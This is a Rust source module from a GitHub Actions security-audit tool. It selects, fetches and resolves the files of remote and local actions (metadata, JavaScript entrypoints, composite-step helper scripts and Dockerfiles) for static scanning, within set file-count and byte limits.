//! Action source selection and fetch for `audit`.
//!
//! Chooses which files of a referenced action are worth scanning (remote
//! actions via the GitHub trees API, local `uses: ./...` actions from disk),
//! fetches them, and routes each file to the matching content scanner in
//! `audit`. Remote action source is untrusted input: it is scanned, never
//! executed.

use anyhow::{Context, Result};
use regex::Regex;
use serde_norway::Value;
use std::collections::{HashMap, HashSet, VecDeque};
use std::io::Read;
use std::path::{Component, Path, PathBuf};
use std::sync::{Arc, LazyLock};
use tokio::sync::Semaphore;

use crate::audit::{
    AuditCollector, ShellScanState, collect_step_run_blocks, extract_job_run_blocks,
    push_docker_ref_result, scan_dockerfile_content, scan_js_content, scan_py_content,
    scan_run_block, scan_shell_content,
};
use crate::audit_shell::shell_words;
use crate::config::Config;
use crate::github::GitHubClient;
use crate::output::ActionFileOrigin;
use crate::workflow::{self, ActionRef, LocalActionRef};

pub(crate) fn remote_action_scan_key(action: &ActionRef) -> String {
    format!("{}@{}", action.full_name(), action.ref_string)
}

/// Third-party dependency dirs, not the action's own source. An action that
/// commits `node_modules/` would otherwise cost thousands of per-file fetches
/// for zero signal. `dist/` is excluded — a bundled `dist/index.js` is the
/// code that actually runs and must still be scanned.
const VENDORED_DIRS: &[&str] = &["node_modules", "site-packages", ".venv", "venv"];

/// Matches whole path components, so `node_modules_helper.js` is not affected.
fn is_vendored_path(path: &str) -> bool {
    path.split('/')
        .any(|component| VENDORED_DIRS.contains(&component))
}

fn is_nonruntime_support_path(path: &str) -> bool {
    path.split('/').any(|component| {
        matches!(
            component,
            ".github" | "__test__" | "__tests__" | "test" | "tests" | "docs" | "examples"
        )
    })
}

/// Max action source files fetched concurrently. Bounds the fan-out so a
/// file-heavy action doesn't burst into a rate-limit-exhausting wave.
const MAX_CONCURRENT_FILE_FETCHES: usize = 8;
const MAX_SOURCE_FILES: usize = 512;
const MAX_SOURCE_FILE_BYTES: usize = 8 * 1024 * 1024;
const MAX_TOTAL_SOURCE_BYTES: usize = 32 * 1024 * 1024;
const MAX_ACTION_GRAPH_SOURCE_BYTES: usize = 64 * 1024 * 1024;
const MAX_ACTION_GRAPH_NODES: usize = 32;
const MAX_ACTION_GRAPH_DEPTH: usize = 8;

static JS_LOCAL_DEPENDENCY_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?m)(?:\bfrom\s+|\bimport\s+)["'](?P<path>\.\.?/[^"']+)["']"#).unwrap()
});
static JS_LOADER_CALL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?m)\b(?:require|import)\s*\(\s*(?P<argument>[^)\r\n]*)\)"#).unwrap()
});
static PYTHON_SIBLING_IMPORT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?m)(?:^|[;:])[ \t]*(?:from\s+(?P<from>\.*[A-Za-z_][A-Za-z0-9_.]*|\.+)\s+import\s+(?P<members>\([^)]*\)|[^\r\n;#]+)|import\s+(?P<imports>[^\r\n;#]+))").unwrap()
});
/// Placeholders that location-derived values are evaluated around, so an
/// executed operand is followed only when it names exactly one file.
/// `SELF_LOCATION` is the running source's directory, `SELF_FILE` its own
/// name beneath it, and `ACTION_LOCATION` the action's directory.
pub(crate) const SELF_LOCATION: &str = "@pinprick-self@";
pub(crate) const SELF_FILE: &str = "@pinprick-file@";
pub(crate) const ACTION_LOCATION: &str = "@pinprick-action@";
/// The repository root, for a directory a followed file inherits.
const REPOSITORY_LOCATION: &str = "@pinprick-repository@";
/// A location-derived value this analysis cannot evaluate.
pub(crate) const UNRESOLVED_LOCATION: &str = "@pinprick-unresolved@";
/// A value that is neither location-derived nor known.
pub(crate) const DYNAMIC_VALUE: &str = "@pinprick-dynamic@";
/// Bounds alias chains, nested command strings and expression nesting.
pub(crate) const MAX_LOCATION_DEPTH: usize = 64;
/// Larger expressions are only checked for direct location references.
const MAX_LOCATION_EXPRESSION_BYTES: usize = 64 * 1024;
/// No path an interpreter runs is longer; a longer value keeps only its
/// provenance, which also stops aliases from doubling a value per level.
pub(crate) const MAX_LOCATION_VALUE_BYTES: usize = 4096;
/// An argument vector longer than this keeps only its provenance.
pub(crate) const MAX_LOCATION_WORDS: usize = 256;
static SHELL_SELF_DIRECTORY_EXPANSION_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\$\{(?:BASH_SOURCE(?:\[0\])?|0)%/\*\}").unwrap());
static SHELL_SELF_FILE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\{BASH_SOURCE(?:\[0\])?\}|\$BASH_SOURCE\b|\$\{0\}|\$0\b").unwrap()
});
static SHELL_PATH_SUBSTITUTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r#"\$\(\s*(?:(?P<dirname>dirname)(?:\s+--)?|readlink(?:\s+-[A-Za-z]+)*|realpath(?:\s+-[A-Za-z]+)*)\s+"?(?P<path>@pinprick-(?:self|action)@[^"\s()]*)"?\s*\)"#,
        r#"|\$\(\s*cd\s+(?:-P\s+)?"?(?P<directory>@pinprick-(?:self|action)@[^"\s()]*)"?\s*(?:&&|;)\s*pwd(?:\s+-P)?\s*\)"#,
    ))
    .unwrap()
});
static SHELL_ACTION_PATH_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\$\{GITHUB_ACTION_PATH\}|\$GITHUB_ACTION_PATH\b").unwrap());
static SHELL_VARIABLE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\{(?P<braced>[A-Za-z_][A-Za-z0-9_]*)(?P<modifier>[^}]*)\}|\$(?P<plain>[A-Za-z_][A-Za-z0-9_]*)")
        .unwrap()
});
static POWERSHELL_SCRIPT_ROOT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\$\{PSScriptRoot\}|\$PSScriptRoot\b").unwrap());
static POWERSHELL_JOIN_PATH_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)\(?\s*Join-Path\s+(?:-Path\s+)?["']?(?P<root>@pinprick-(?:self|action)@[^\s"')]*)["']?\s+(?:-ChildPath\s+)?["']?(?P<child>[^\s"')]+)["']?\s*\)?"#,
    )
    .unwrap()
});
static POWERSHELL_ASSIGNMENT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^\s*\$(?P<name>[A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?P<value>[^=\s].*)$").unwrap()
});
static IDENTIFIER_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z_$][A-Za-z0-9_$]*").unwrap());
static PY_EXECUTION_CALL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"\b(?P<name>system|popen|getoutput|getstatusoutput|run|call|check_call|check_output",
        r"|Popen|exec[lv]p?e?|posix_spawnp?|spawn[lv]p?e?|run_path|load_source",
        r"|spec_from_file_location|exec)\s*\(",
    ))
    .unwrap()
});
static PY_CHDIR_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\bos\.chdir\s*\(").unwrap());
static PY_ASSIGNMENT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?m)(?:^|;)[ \t]*(?P<name>[A-Za-z_][A-Za-z0-9_]*)[ \t]*(?::[^=\n]+)?(?P<operator>(?:\*\*|//|>>|<<|[-+*/%&|^@])?=)(?:[^=]|$)",
    )
    .unwrap()
});
static PY_REBINDING_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"(?m)^[ \t]*(?:async[ \t]+)?for[ \t]+(?P<loop>[^:\n]+?)[ \t]+in\b",
        r"|(?:^|;)[ \t]*(?P<unpack>[A-Za-z_(\[][\w \t,()\[\]*.]*,[\w \t,()\[\]*.]*)=[^=]",
        r"|\bas[ \t]+(?P<alias>[A-Za-z_][A-Za-z0-9_]*)",
        r"|(?P<walrus>[A-Za-z_][A-Za-z0-9_]*)[ \t]*:=",
    ))
    .unwrap()
});
static PY_MODULE_LOADER_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"\b(?:importlib\.import_module|__import__|runpy\.run_module)\s*\(\s*(?:["'](?P<module>[A-Za-z_][A-Za-z0-9_.]*)["']|[^\s)])"#,
    )
    .unwrap()
});
static PY_KEYWORD_ARGUMENT_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*\s*=[^=]").unwrap());
static ACTION_PATH_EXPRESSION_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\$\{\{\s*github\.action_path\s*\}\}").unwrap());
static SHELL_LOCAL_SOURCE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?m)^\s*(?:source|\.)\s+["']?(?P<path>\.{1,2}/[^\s"';]+)"#).unwrap()
});
static SHELL_ACTION_SOURCE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?m)^\s*(?:source|\.)\s+["']?(?:\$GITHUB_ACTION_PATH|\$\{GITHUB_ACTION_PATH\}|\$PSScriptRoot)[/\\](?P<path>[^\s"';]+)"#,
    )
    .unwrap()
});
static ACTION_PATH_CD_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"^\s*(?:cd|pushd)\s+["']?(?:\$GITHUB_ACTION_PATH|\$\{GITHUB_ACTION_PATH\}|\$\{\{\s*github\.action_path\s*\}\})(?P<suffix>(?:/[A-Za-z0-9._-]+)*)["']?\s*$"#,
    )
    .unwrap()
});
static POWERSHELL_ACTION_PATH_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\$\{env:GITHUB_ACTION_PATH\}|\$env:GITHUB_ACTION_PATH\b").unwrap()
});
static JOIN_PATH_ACTION_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?i)\(?\s*Join-Path\s+(?:-Path\s+)?["']?(?P<root>\$\{GITHUB_ACTION_PATH\}|\$GITHUB_ACTION_PATH|\$PSScriptRoot)["']?\s+(?:-ChildPath\s+)?["']?(?P<child>[A-Za-z0-9._/\\-]+)["']?\s*\)?"#,
    )
    .unwrap()
});

fn cap_targets_prioritizing_entrypoints<T>(
    targets: &mut Vec<T>,
    initial_len: usize,
) -> Option<usize> {
    if targets.len() <= MAX_SOURCE_FILES {
        return None;
    }
    let added = targets.split_off(initial_len);
    let keep_initial = MAX_SOURCE_FILES.saturating_sub(added.len().min(MAX_SOURCE_FILES));
    targets.truncate(keep_initial);
    targets.extend(added.into_iter().take(MAX_SOURCE_FILES - keep_initial));
    Some(keep_initial)
}

/// Which scanner handles a given action source file.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub(crate) enum SourceFileKind {
    ActionYml,
    WorkflowYml,
    JavaScript,
    Python,
    Shell,
    Dockerfile,
}

type LocalSourceCollection = (Vec<(PathBuf, SourceFileKind)>, Vec<PathBuf>, bool);

/// Whether all selected action source files were fetched and parsed well
/// enough to support a durable "clean" verdict.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ActionScanStatus {
    Complete,
    Incomplete,
}

#[derive(Debug, Default)]
struct NestedUses {
    complete: bool,
    remote: Vec<ActionRef>,
    local: Vec<String>,
}

impl NestedUses {
    fn complete() -> Self {
        Self {
            complete: true,
            ..Self::default()
        }
    }
}

impl ActionScanStatus {
    fn from_complete(complete: bool) -> Self {
        if complete {
            Self::Complete
        } else {
            Self::Incomplete
        }
    }
}

/// Select the files in a fetched action tree worth scanning, each paired with
/// its scanner, in tree order. Pure (no I/O) so the filtering is unit testable.
fn select_source_files(
    tree: &[crate::github::TreeEntry],
    base: &str,
) -> Vec<(String, SourceFileKind)> {
    let mut targets = Vec::new();
    for entry in tree {
        if entry.entry_type != "blob" {
            continue;
        }
        let path = &entry.path;
        if is_vendored_path(path) {
            continue;
        }
        if !base.is_empty() && path != base && !path.starts_with(&format!("{base}/")) {
            continue;
        }
        let relative = if base.is_empty() {
            path.as_str()
        } else {
            path.strip_prefix(base)
                .unwrap_or(path)
                .trim_start_matches('/')
        };
        let kind = if path == base && is_reusable_workflow(path) {
            SourceFileKind::WorkflowYml
        } else if matches!(relative, "action.yml" | "action.yaml") {
            SourceFileKind::ActionYml
        } else {
            // Runtime source is added from action metadata and then followed
            // through statically resolvable in-repository dependencies.
            continue;
        };
        targets.push((path.clone(), kind));
    }
    if targets.is_empty() && !is_reusable_workflow(base) {
        for name in ["Dockerfile", "dockerfile"] {
            let path = if base.is_empty() {
                name.to_string()
            } else {
                format!("{base}/{name}")
            };
            if tree
                .iter()
                .any(|entry| entry.path == path && entry.entry_type == "blob")
            {
                targets.push((path, SourceFileKind::Dockerfile));
                break;
            }
        }
    }
    targets
}

fn force_include_remote_action_entrypoints(
    tree: &[crate::github::TreeEntry],
    targets: &mut Vec<(String, SourceFileKind)>,
    contents: &[Option<Result<String>>],
    contexts: &mut HashMap<String, LocatedDirectory>,
) -> bool {
    let mut complete = true;
    let metadata: Vec<(String, String)> = targets
        .iter()
        .zip(contents)
        .filter_map(|((path, kind), content)| {
            if *kind != SourceFileKind::ActionYml {
                return None;
            }
            let Some(Ok(content)) = content.as_ref() else {
                complete = false;
                return None;
            };
            Some((path.clone(), content.clone()))
        })
        .collect();

    for (path, content) in metadata {
        let Ok(yaml) = serde_norway::from_str::<Value>(&content) else {
            complete = false;
            continue;
        };
        let base = path.rsplit_once('/').map_or("", |(base, _)| base);
        complete &= action_yml_runtime_paths_complete(&yaml, base);
        for (entrypoint, kind) in action_yml_entrypoint_paths(&yaml, base) {
            push_unique_source_target(targets, entrypoint, kind);
        }
        for helper in action_yml_helper_paths(&yaml, base) {
            if helper.optional && !tree.iter().any(|entry| entry.path == helper.path) {
                continue;
            }
            enter_directory(contexts, &helper.path, helper.directory);
            if !targets.contains(&(helper.path.clone(), helper.kind)) {
                targets.push((helper.path, helper.kind));
            }
        }
        if let Some(dockerfile) = action_yml_dockerfile_path(&yaml, base) {
            push_unique_source_target(targets, dockerfile, SourceFileKind::Dockerfile);
        }
    }
    complete
}

fn force_include_local_action_entrypoints(
    repo_root: &Path,
    action_dir: &Path,
    targets: &mut Vec<(PathBuf, SourceFileKind)>,
    contexts: &mut HashMap<String, LocatedDirectory>,
) -> bool {
    let mut complete = true;
    let metadata_paths: Vec<PathBuf> = targets
        .iter()
        .filter_map(|(path, kind)| (*kind == SourceFileKind::ActionYml).then_some(path.clone()))
        .collect();

    for path in metadata_paths {
        let Ok(Some(content)) = read_local_source_file(repo_root, &path) else {
            complete = false;
            continue;
        };
        let Ok(yaml) = serde_norway::from_str::<Value>(&content) else {
            complete = false;
            continue;
        };
        let Some(action_base) = action_dir
            .strip_prefix(repo_root)
            .ok()
            .map(|path| path.to_string_lossy().replace('\\', "/"))
        else {
            complete = false;
            continue;
        };
        complete &= action_yml_runtime_paths_complete(&yaml, &action_base);
        let helpers = action_yml_helper_paths(&yaml, &action_base);
        let entrypoints = action_yml_entrypoint_paths(&yaml, &action_base)
            .into_iter()
            .chain(
                action_yml_dockerfile_path(&yaml, &action_base)
                    .map(|p| (p, SourceFileKind::Dockerfile)),
            )
            .map(|(path, kind)| (path, kind, None, false))
            .chain(helpers.into_iter().map(|helper| {
                (
                    helper.path,
                    helper.kind,
                    Some(helper.directory),
                    helper.optional,
                )
            }));
        for (entrypoint, kind, directory, optional) in entrypoints {
            let path = repo_root.join(&entrypoint);
            let Some(relative) = path.strip_prefix(repo_root).ok() else {
                complete = false;
                continue;
            };
            match workflow::open_child_file_path(repo_root, relative) {
                Ok(Some(_)) => match directory {
                    // A helper run by another interpreter keeps its own scan.
                    Some(directory) => {
                        enter_directory(contexts, &entrypoint, directory);
                        if !targets.contains(&(path.clone(), kind)) {
                            targets.push((path, kind));
                        }
                    }
                    None => push_unique_local_source_target(targets, path, kind),
                },
                Ok(None) if optional => {}
                Ok(None) | Err(_) => complete = false,
            }
        }
    }
    complete
}

fn action_yml_entrypoint_paths(yaml: &Value, base: &str) -> Vec<(String, SourceFileKind)> {
    let Some(runs) = yaml.get("runs").and_then(|r| r.as_mapping()) else {
        return Vec::new();
    };
    let kind = match runs.get("using").and_then(|v| v.as_str()) {
        Some(using) if using.starts_with("node") => SourceFileKind::JavaScript,
        _ => return Vec::new(),
    };

    ["main", "pre", "post"]
        .into_iter()
        .filter_map(|key| runs.get(key).and_then(|v| v.as_str()))
        .filter_map(|path| normalize_action_entrypoint_path(base, path))
        .map(|path| (path, kind))
        .collect()
}

fn action_yml_runtime_paths_complete(yaml: &Value, base: &str) -> bool {
    let Some(runs) = yaml.get("runs").and_then(|runs| runs.as_mapping()) else {
        return false;
    };
    let Some(using) = runs.get("using").and_then(|value| value.as_str()) else {
        return false;
    };
    if using.starts_with("node") {
        for key in ["main", "pre", "post"] {
            match runs.get(key) {
                Some(value) => {
                    let Some(path) = value.as_str() else {
                        return false;
                    };
                    if normalize_action_entrypoint_path(base, path).is_none() {
                        return false;
                    }
                }
                None if key == "main" => return false,
                None => {}
            }
        }
        true
    } else if using.eq_ignore_ascii_case("docker") {
        let Some(image) = runs.get("image").and_then(|value| value.as_str()) else {
            return false;
        };
        image.starts_with("docker://") || normalize_action_entrypoint_path(base, image).is_some()
    } else if using.eq_ignore_ascii_case("composite") {
        runs.get("steps")
            .is_some_and(|steps| steps.as_sequence().is_some())
            && composite_helpers(yaml, base).1
    } else {
        false
    }
}

/// A file a composite step runs. An optional one is a module an
/// interpreter may also find outside the action.
struct CompositeHelper {
    path: String,
    kind: SourceFileKind,
    directory: LocatedDirectory,
    optional: bool,
}

fn action_yml_helper_paths(yaml: &Value, base: &str) -> Vec<CompositeHelper> {
    composite_helpers(yaml, base).0
}

/// Files a composite action's steps execute, repository-relative, with the
/// kind that runs each and the directory it starts in. The flag is false
/// when an execution, or an action file a step mentions, cannot be followed.
fn composite_helpers(yaml: &Value, base: &str) -> (Vec<CompositeHelper>, bool) {
    let Some(steps) = yaml.get("runs").and_then(|runs| runs.get("steps")) else {
        return (Vec::new(), true);
    };
    let mut executions = Vec::new();
    let mut mentions = Vec::new();
    for step in collect_step_run_contexts(steps) {
        let run = normalize_action_path_references(step.run, &step.env);
        mentions.extend(action_path_mentions(&run));
        let directory = match step.working_directory {
            None => LocatedDirectory::Caller,
            Some(working_directory) => match action_path_working_directory(working_directory) {
                Some(suffix) if suffix.is_empty() => {
                    LocatedDirectory::Located(ACTION_LOCATION.to_string())
                }
                Some(suffix) => LocatedDirectory::Located(format!("{ACTION_LOCATION}/{suffix}")),
                None => {
                    executions.push(LocatedExecution::unresolved(SourceFileKind::Shell));
                    LocatedDirectory::Unresolved
                }
            },
        };
        let first = executions.len();
        let program = step
            .shell
            .and_then(|shell| shell.split_whitespace().next())
            .unwrap_or("bash");
        match script_interpreter(program) {
            Interpreter::Script(_, InterpreterFamily::Python | InterpreterFamily::Node) => {
                let environment = step
                    .env
                    .iter()
                    .filter_map(|(name, value)| {
                        let value = ACTION_PATH_EXPRESSION_RE
                            .replace_all(value, regex::NoExpand(ACTION_LOCATION));
                        is_location_derived(&value).then(|| (name.to_string(), value.into_owned()))
                    })
                    .collect();
                let context = SourceContext {
                    directory,
                    environment,
                    native_modules: false,
                    patched_builtins: Vec::new(),
                };
                let code = ACTION_PATH_EXPRESSION_RE
                    .replace_all(step.run, regex::NoExpand(ACTION_LOCATION));
                if matches!(
                    script_interpreter(program),
                    Interpreter::Script(_, InterpreterFamily::Python)
                ) {
                    executions.extend(python_located_executions(&code, &context).0);
                } else {
                    executions.extend(crate::audit_javascript::located_executions(
                        "", &code, &context,
                    ));
                }
            }
            Interpreter::Script(_, family) => shell_script_executions(
                &run,
                family == InterpreterFamily::PowerShell,
                ShellScan {
                    depth: 0,
                    composite: true,
                },
                ShellLocationState::starting_in(directory),
                &mut executions,
            ),
            _ if mentions_action_path(&run) => {
                executions.push(LocatedExecution::unresolved(SourceFileKind::Shell));
            }
            _ => {}
        }
        // An inline step's own directory is the runner's temporary one.
        for execution in &mut executions[first..] {
            if execution
                .path
                .as_deref()
                .is_some_and(|path| !path.starts_with(ACTION_LOCATION))
            {
                execution.path = None;
            }
        }
    }
    let mut complete = true;
    let mut helpers: Vec<CompositeHelper> = Vec::new();
    for execution in &executions {
        let Some(path) = execution
            .path
            .as_deref()
            .and_then(|path| resolve_located_path(path, "", base))
        else {
            complete &= execution.optional;
            continue;
        };
        let directory = execution
            .directory
            .as_ref()
            .map_or(LocatedDirectory::Caller, |directory| {
                resolve_located_directory(directory, "", base)
            });
        match helpers
            .iter_mut()
            .find(|helper| helper.path == path && helper.kind == execution.kind)
        {
            Some(helper) => {
                helper.directory = helper.directory.merge(&directory);
                helper.optional &= execution.optional;
            }
            None => helpers.push(CompositeHelper {
                path,
                kind: execution.kind,
                directory,
                optional: execution.optional,
            }),
        }
    }
    // Every action file a step names must be scanned: a copy or an
    // unrecognized command may still run it.
    for relative in mentions {
        let Some(path) = normalize_action_entrypoint_path(base, &relative) else {
            complete = false;
            continue;
        };
        if helpers.iter().any(|helper| helper.path == path) {
            continue;
        }
        match executable_source_kind(&relative) {
            Some(kind) => helpers.push(CompositeHelper {
                path,
                kind,
                directory: LocatedDirectory::Caller,
                optional: false,
            }),
            None => complete = false,
        }
    }
    (helpers, complete)
}

/// Action files named after `$GITHUB_ACTION_PATH/` in a step.
fn action_path_mentions(run: &str) -> Vec<String> {
    let mut mentions = Vec::new();
    for prefix in [
        "$GITHUB_ACTION_PATH/",
        "$GITHUB_ACTION_PATH\"/",
        "${GITHUB_ACTION_PATH}/",
        "${GITHUB_ACTION_PATH}\"/",
        "$PSScriptRoot/",
        "$PSScriptRoot\"/",
        "$PSScriptRoot\\",
    ] {
        let mut remaining = run;
        while let Some(index) = remaining.find(prefix) {
            let tail = &remaining[index + prefix.len()..];
            let end = tail
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '\'' | '"' | '`' | ';' | '|' | '&' | '(' | ')')
                })
                .unwrap_or(tail.len());
            let relative = tail[..end].replace('\\', "/");
            if !relative.is_empty() && !mentions.contains(&relative) {
                mentions.push(relative);
            }
            remaining = &tail[end..];
        }
    }
    mentions
}

fn shell_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let mut characters = name.chars();
    characters
        .next()
        .is_some_and(|character| character == '_' || character.is_ascii_alphabetic())
        && characters.all(|character| character == '_' || character.is_ascii_alphanumeric())
}

fn action_path_working_directory(value: &str) -> Option<String> {
    let normalized =
        ACTION_PATH_EXPRESSION_RE.replace_all(value, regex::NoExpand("${GITHUB_ACTION_PATH}"));
    let value = normalized.as_ref();
    let command;
    let trimmed = value.trim_start();
    let is_directory_command = ["cd", "pushd"].iter().any(|command| {
        trimmed
            .strip_prefix(command)
            .and_then(|remaining| remaining.chars().next())
            .is_some_and(char::is_whitespace)
    });
    let value = if is_directory_command {
        value
    } else {
        command = format!("cd {}", value.trim());
        &command
    };
    ACTION_PATH_CD_RE.captures(value).map(|captures| {
        captures
            .name("suffix")
            .map_or("", |suffix| suffix.as_str())
            .trim_start_matches('/')
            .to_string()
    })
}

struct StepRunContext<'a> {
    run: &'a str,
    shell: Option<&'a str>,
    working_directory: Option<&'a str>,
    env: Vec<(&'a str, &'a str)>,
}

fn collect_step_run_contexts(steps: &Value) -> Vec<StepRunContext<'_>> {
    fn collect<'a>(steps: &'a Value, runs: &mut Vec<StepRunContext<'a>>) {
        let Some(sequence) = steps.as_sequence() else {
            return;
        };
        for step in sequence {
            let Some(mapping) = step.as_mapping() else {
                continue;
            };
            if let Some(run) = mapping.get("run").and_then(Value::as_str) {
                let env = mapping
                    .get("env")
                    .and_then(Value::as_mapping)
                    .into_iter()
                    .flatten()
                    .filter_map(|(name, value)| Some((name.as_str()?, value.as_str()?)))
                    .collect();
                runs.push(StepRunContext {
                    run,
                    shell: mapping.get("shell").and_then(Value::as_str),
                    working_directory: mapping.get("working-directory").and_then(Value::as_str),
                    env,
                });
            }
            if let Some(parallel) = mapping.get("parallel") {
                collect(parallel, runs);
            }
        }
    }
    let mut runs = Vec::new();
    collect(steps, &mut runs);
    runs
}

/// Rewrite the spellings a step can use for its action directory into
/// `${GITHUB_ACTION_PATH}`, including step `env:` variables that hold it, so
/// helper discovery and the unresolved-reference check see one form.
fn normalize_action_path_references(run: &str, env: &[(&str, &str)]) -> String {
    let mut run = run.to_string();
    for (name, value) in env {
        let value = normalize_action_path_spellings(value);
        if !mentions_action_path(&value) {
            continue;
        }
        let Ok(variable) = Regex::new(&format!(
            r"\$\{{(?i:env:)?{name}\}}|\$(?i:env:)?{name}\b",
            name = regex::escape(name)
        )) else {
            continue;
        };
        run = variable
            .replace_all(&run, regex::NoExpand(&value))
            .into_owned();
    }
    normalize_action_path_spellings(&run)
}

fn normalize_action_path_spellings(value: &str) -> String {
    let value =
        ACTION_PATH_EXPRESSION_RE.replace_all(value, regex::NoExpand("${GITHUB_ACTION_PATH}"));
    let value =
        POWERSHELL_ACTION_PATH_RE.replace_all(&value, regex::NoExpand("${GITHUB_ACTION_PATH}"));
    JOIN_PATH_ACTION_RE
        .replace_all(&value, "${root}/${child}")
        .into_owned()
}

fn mentions_action_path(value: &str) -> bool {
    value.contains("${GITHUB_ACTION_PATH}")
        || value.contains("$GITHUB_ACTION_PATH")
        || value.contains("$PSScriptRoot")
}

pub(crate) fn executable_source_kind(path: &str) -> Option<SourceFileKind> {
    if is_javascript_source(path) {
        Some(SourceFileKind::JavaScript)
    } else if path.ends_with(".py") {
        Some(SourceFileKind::Python)
    } else if is_shell_source(path) {
        Some(SourceFileKind::Shell)
    } else {
        None
    }
}

/// The Dockerfile a container action builds from, when its metadata names one.
///
/// A repository may carry Dockerfiles that no action references (test
/// fixtures, examples, its own CI images). Those never run for a consumer, so
/// reachability comes from `runs.image` rather than from a file being named
/// `Dockerfile`. A `docker://` image is a registry reference, not a path in
/// this repository, and the container-ref rules cover it instead.
fn action_yml_dockerfile_path(yaml: &Value, base: &str) -> Option<String> {
    let runs = yaml.get("runs").and_then(|r| r.as_mapping())?;
    if !runs
        .get("using")
        .and_then(|v| v.as_str())
        .is_some_and(|using| using.eq_ignore_ascii_case("docker"))
    {
        return None;
    }
    let image = runs.get("image").and_then(|v| v.as_str())?;
    if image.starts_with("docker://") {
        return None;
    }
    normalize_action_entrypoint_path(base, image)
}

fn normalize_action_entrypoint_path(base: &str, path: &str) -> Option<String> {
    let path = path.trim();
    if path.is_empty() || path.contains('\\') {
        return None;
    }
    let rel = Path::new(path);
    if rel.is_absolute() {
        return None;
    }

    let mut parts = Vec::new();
    for component in Path::new(base).components().chain(rel.components()) {
        match component {
            Component::Normal(part) => parts.push(part.to_str()?.to_string()),
            Component::CurDir => {}
            Component::ParentDir => {
                parts.pop()?;
            }
            _ => return None,
        }
    }
    if parts.is_empty() {
        return None;
    }

    Some(parts.join("/"))
}

fn push_unique_source_target(
    targets: &mut Vec<(String, SourceFileKind)>,
    path: String,
    kind: SourceFileKind,
) {
    if let Some((_, existing_kind)) = targets.iter_mut().find(|(existing, _)| existing == &path) {
        *existing_kind = kind;
    } else {
        targets.push((path, kind));
    }
}

fn push_unique_local_source_target(
    targets: &mut Vec<(PathBuf, SourceFileKind)>,
    path: PathBuf,
    kind: SourceFileKind,
) {
    if let Some((_, existing_kind)) = targets.iter_mut().find(|(existing, _)| existing == &path) {
        *existing_kind = kind;
    } else {
        targets.push((path, kind));
    }
}

fn read_local_source_file(repo_root: &Path, path: &Path) -> Result<Option<String>> {
    let relative = path
        .strip_prefix(repo_root)
        .with_context(|| format!("{} is outside the repository", path.display()))?;
    let Some(mut file) = workflow::open_child_file_path(repo_root, relative)? else {
        return Ok(None);
    };
    if file.metadata()?.len() > MAX_SOURCE_FILE_BYTES as u64 {
        anyhow::bail!(
            "{} exceeds the {} byte source-file limit",
            path.display(),
            MAX_SOURCE_FILE_BYTES
        );
    }
    let mut content = String::new();
    file.by_ref()
        .take(MAX_SOURCE_FILE_BYTES as u64 + 1)
        .read_to_string(&mut content)
        .with_context(|| format!("reading {}", path.display()))?;
    if content.len() > MAX_SOURCE_FILE_BYTES {
        anyhow::bail!(
            "{} exceeds the {} byte source-file limit",
            path.display(),
            MAX_SOURCE_FILE_BYTES
        );
    }
    Ok(Some(content))
}

async fn fetch_remote_source_files(
    client: &GitHubClient,
    action: &ActionRef,
    targets: &[(String, SourceFileKind)],
    max_total_bytes: usize,
) -> (Vec<Option<Result<String>>>, bool, usize) {
    let semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_FILE_FETCHES));
    let mut fetches = tokio::task::JoinSet::new();
    for (index, (path, _)) in targets.iter().enumerate() {
        let client = client.clone();
        let owner = action.owner.clone();
        let repo = action.repo.clone();
        let git_ref = action.ref_string.clone();
        let path = path.clone();
        let semaphore = Arc::clone(&semaphore);
        fetches.spawn(async move {
            let _permit = semaphore.acquire_owned().await.ok();
            let content = client.fetch_file(&owner, &repo, &path, &git_ref).await;
            (index, content)
        });
    }

    let mut contents: Vec<Option<Result<String>>> = (0..targets.len()).map(|_| None).collect();
    let mut complete = true;
    let mut total_bytes = 0usize;
    while let Some(joined) = fetches.join_next().await {
        match joined {
            Ok((index, Ok(content))) => {
                if content.len() > MAX_SOURCE_FILE_BYTES {
                    complete = false;
                    continue;
                }
                let Some(next_total) = total_bytes.checked_add(content.len()) else {
                    complete = false;
                    fetches.abort_all();
                    break;
                };
                if next_total > max_total_bytes {
                    complete = false;
                    fetches.abort_all();
                    break;
                }
                total_bytes = next_total;
                contents[index] = Some(Ok(content));
            }
            Ok((index, Err(error))) => {
                complete = false;
                contents[index] = Some(Err(error));
            }
            Err(_) => {
                complete = false;
            }
        }
    }

    (contents, complete, total_bytes)
}

